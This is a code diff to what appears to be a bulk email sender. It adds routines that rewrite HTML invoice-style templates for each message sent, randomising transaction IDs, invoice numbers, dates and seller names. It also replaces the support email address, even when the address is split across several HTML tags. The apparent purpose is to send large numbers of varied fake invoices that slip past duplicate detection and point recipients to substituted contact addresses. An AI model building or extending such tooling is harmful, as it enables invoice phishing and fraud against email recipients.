@@ -167,6 +167,72 @@ function formatDateLike(isoDate) {
   return `${_MONTHS[m - 1]} ${d} ${y}`;
 }
 
+// ── Split-tag email replacer ──────────────────────────────────────────────────
+// Handles the case where an email address is split across multiple HTML tags,
+// e.g. <a>support@</a><a>evolvesolutionsllc</a><a>.com</a>
+// In this pattern the complete email never appears as a string in the source,
+// so normal string/regex replacement misses it entirely.
+
+function _replaceEmailSplitTags(html, oldEmail, newEmail) {
+  const atIdx = oldEmail.indexOf('@');
+  if (atIdx === -1) return html;
+
+  const oldLocal     = oldEmail.slice(0, atIdx);        // "support"
+  const oldDomainFull = oldEmail.slice(atIdx + 1);      // "evolvesolutionsllc.com"
+  const newAtIdx     = newEmail.indexOf('@');
+  const newLocal     = newEmail.slice(0, newAtIdx);     // "billing"
+  const newDomainFull = newEmail.slice(newAtIdx + 1);   // "evolvesolutions.net"
+
+  const esc = s => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+
+  let out = html;
+
+  // ── Pass 1: local part in its own text node (">support@<") ───────────────
+  const localAtRe = new RegExp('>' + esc(oldLocal) + '@<', 'g');
+  let localCount = 0;
+  out = out.replace(localAtRe, () => { localCount++; return '>' + newLocal + '@<'; });
+
+  if (localCount > 0) {
+    // ── Pass 2: domain may be split further (">evolvesolutionsllc<" and ">.com<")
+    //            or together (">evolvesolutionsllc.com<")
+
+    // Try full domain as one text node first
+    const fullDomRe = new RegExp('>' + esc(oldDomainFull) + '<', 'g');
+    out = out.replace(fullDomRe, () => '>' + newDomainFull + '<');
+
+    // Then try domain body and TLD as separate text nodes
+    const dotIdx    = oldDomainFull.lastIndexOf('.');
+    const oldDomain = oldDomainFull.slice(0, dotIdx);    // "evolvesolutionsllc"
+    const oldTld    = oldDomainFull.slice(dotIdx);        // ".com"
+    const newDotIdx = newDomainFull.lastIndexOf('.');
+    const newDomain = newDomainFull.slice(0, newDotIdx);
+    const newTld    = newDomainFull.slice(newDotIdx);
+
+    if (oldDomain) {
+      const domRe = new RegExp('>' + esc(oldDomain) + '<', 'g');
+      out = out.replace(domRe, () => '>' + newDomain + '<');
+    }
+    if (oldTld) {
+      const tldRe = new RegExp('>' + esc(oldTld) + '<', 'g');
+      out = out.replace(tldRe, () => '>' + newTld + '<');
+    }
+  }
+
+  // ── Pass 3: local+@ not isolated but email split as "support@evolvesolutionsllc" + ".com"
+  if (localCount === 0) {
+    const localDomRe = new RegExp('>' + esc(oldLocal + '@' + oldDomainFull.split('.')[0]) + '<', 'g');
+    let ld = 0;
+    out = out.replace(localDomRe, () => { ld++; return '>' + newLocal + '@' + newDomainFull.split('.')[0] + '<'; });
+    if (ld > 0) {
+      const dotIdx = oldDomainFull.lastIndexOf('.');
+      const tldRe = new RegExp('>' + esc(oldDomainFull.slice(dotIdx)) + '<', 'g');
+      out = out.replace(tldRe, () => '>' + newDomainFull.slice(newDomainFull.lastIndexOf('.')) + '<');
+    }
+  }
+
+  return out;
+}
+
 // ── Main per-email randomizer ─────────────────────────────────────────────────
 // Called once per email in the send loop.
 // detected: { txnValue, invValue, dateValue, sellerName, emailValue }
@@ -176,7 +242,7 @@ function randomizeIds(html, detected, fixedDateIso) {
   let out = html;
   const log = [];
 
-  const { txnValue, invValue, dateValue, sellerName, emailValue } = detected;
+  const { txnValue, invValue, dateValue, sellerName, emailValue, emailHref } = detected;
 
   // Transaction ID
   if (txnValue) {
@@ -205,9 +271,34 @@ function randomizeIds(html, detected, fixedDateIso) {
   // Support email (randomized per email from seller name)
   if (emailValue && sellerName) {
     const newEmail = generateEmail(sellerName);
+    let emailReplaced = false;
+
+    // Replace the visible email (may be complete string or split across tags)
     const r = replaceValue(out, emailValue, newEmail, true);
     out = r.out;
-    if (r.count > 0) log.push('Email: ' + emailValue + ' → ' + newEmail);
+    if (r.count > 0) emailReplaced = true;
+
+    // Replace the href email if it differs from the visible one (e.g. abbreviated href)
+    if (emailHref && emailHref !== emailValue) {
+      const rh = replaceValue(out, emailHref, newEmail, true);
+      out = rh.out;
+      if (rh.count > 0) emailReplaced = true;
+    }
+
+    // Split-tag pass: handles email fragmented across separate HTML tags
+    // (e.g. <a>support@</a><a>domain</a><a>.com</a>) — normal string match misses these
+    const beforeSplit = out;
+    out = _replaceEmailSplitTags(out, emailValue, newEmail);
+    if (out !== beforeSplit) emailReplaced = true;
+
+    // Also run split-tag pass for href email if different
+    if (emailHref && emailHref !== emailValue) {
+      const beforeSplitH = out;
+      out = _replaceEmailSplitTags(out, emailHref, newEmail);
+      if (out !== beforeSplitH) emailReplaced = true;
+    }
+
+    if (emailReplaced) log.push('Email: ' + emailValue + ' → ' + newEmail);
   }
 
   return { out, log };
